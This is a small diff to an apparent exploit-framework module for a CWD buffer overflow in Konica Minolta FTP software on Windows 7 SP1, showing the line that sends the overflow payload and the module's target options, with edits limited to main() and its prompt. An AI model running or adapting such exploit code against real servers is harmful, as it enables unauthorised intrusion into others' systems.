@@ -17,8 +17,8 @@ class konicaMinoltaCwdOverflowMenu(core.Exploit):
       s.recv(1024)
       s.send("CWD " + p)
       self.disconnect(s)
-def main():
+def main(s):
   konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu("konica_minolta_cwd_overflow", "Windows 7 SP1 x86", "konica_minolta_cwd.shell", {"user":"", "passwd":"", "host":""}, {"user":"the user to login as", "passwd":"the password to use", "host":"the IP of the target"})
-  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
+  konicaminoltacwdoverflowmenu.cmdloop()
 if __name__ == '__main__':
-  main()
+  main("")
